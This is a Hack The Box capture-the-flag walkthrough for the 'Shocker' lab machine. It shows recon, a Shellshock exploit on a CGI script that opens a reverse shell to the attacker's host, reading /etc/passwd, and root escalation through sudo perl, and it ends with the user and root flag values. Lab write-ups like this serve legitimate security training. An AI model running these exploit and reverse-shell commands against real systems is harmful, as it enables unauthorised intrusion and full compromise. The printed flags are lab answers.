# [06 - Shocker](https://app.hackthebox.com/machines/Shocker)

  * [description](#description)
  * [walkthrough](#walkthrough)
    * [recon](#recon)
    * [80](#80)
    * [help](#help)
    * [shelly](#shelly)
  * [flag](#flag)
  * [description](#description)
  * [walkthrough](#walkthrough)
    * [recon](#recon)
  * [flag](#flag)
![Shocker.png](Shocker.png)

## description
> 10.10.10.56

## walkthrough

### recon

```
$ nmap -sV -sC -A -Pn -p- shocker.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-23 14:54 MDT
Nmap scan report for shocker.htb (10.10.10.56)
Host is up (0.058s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 80

returns
> Don't bug me!

with

![bug.jpg](bug.jpg)


gobuster dir with `common.txt` found nothing except index.html
gobuster vhosts with subdomain-5000 found a few `\d` subdomains, all 400 and the same length (422)

the name definitely leans towards `ShellShock`, but we still need something other than index.html, right?

`/cgi-bin` gives us a 403, while `/cgi-bin2` gives a 404, there is something there.. what are some defaults? `index.cgi` does not exist

`CGIs.txt` has ~700 matches for that and we already ran it with no results

tried `/cgi-bin/` with `bugme`, `bug`, `bug-me` flavors of `.pl` and `.cgi`

apache has default cgi-bin scripts that should be accessible
  * http://shocker.htb/cgi-bin/printenv
  * http://shocker.htb/cgi-bin/test-cgi

but they are 404 as well

tried
`	pages = ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]`

404

we're missing something.



### help

```
$ curl http://shocker.htb/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 18:22:16 up  1:34,  0 users,  load average: 0.02, 0.03, 0.00
```

```
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/user.sh
TARGETURI => /cgi-bin/user.sh
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

[*] Started reverse TCP handler on 172.16.0.34:4444
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Exploit completed, but no session was created.
```

hmm.

```
$ python ~/git/searchsploit/exploits/linux/remote/34900.py payload=reverse rhost=shocker.htb lhost=10.10.14.9 lport=4445 pages=/cgi-bin/user.sh
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> id -a
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

that'll do.

```
10.10.10.56> ls -la /home/shelly
total 36
drwxr-xr-x 4 shelly shelly 4096 Sep 22  2017 .
drwxr-xr-x 3 root   root   4096 Sep 22  2017 ..
-rw------- 1 root   root      0 Sep 25  2017 .bash_history
-rw-r--r-- 1 shelly shelly  220 Sep 22  2017 .bash_logout
-rw-r--r-- 1 shelly shelly 3771 Sep 22  2017 .bashrc
drwx------ 2 shelly shelly 4096 Sep 22  2017 .cache
drwxrwxr-x 2 shelly shelly 4096 Sep 22  2017 .nano
-rw-r--r-- 1 shelly shelly  655 Sep 22  2017 .profile
-rw-r--r-- 1 root   root     66 Sep 22  2017 .selected_editor
-rw-r--r-- 1 shelly shelly    0 Sep 22  2017 .sudo_as_admin_successful
-r--r--r-- 1 root   root     33 Sep 22  2017 user.txt
10.10.10.56> cat /home/shelly/user.txt
2ec24e11320026d1e70ff3e16695b233
```

boom.

### shelly


```
10.10.10.56> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/sys
```

not a real user?


running linpeas in this shell isn't great - but it gets the job done

```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```

```
10.10.10.56> sudo perl -e 'exec "/bin/cat /root/root.txt";'
52c2715605d70c7619030560dc1ca467
```


## flag
```
user:2ec24e11320026d1e70ff3e16695b233
root:52c2715605d70c7619030560dc1ca467
```
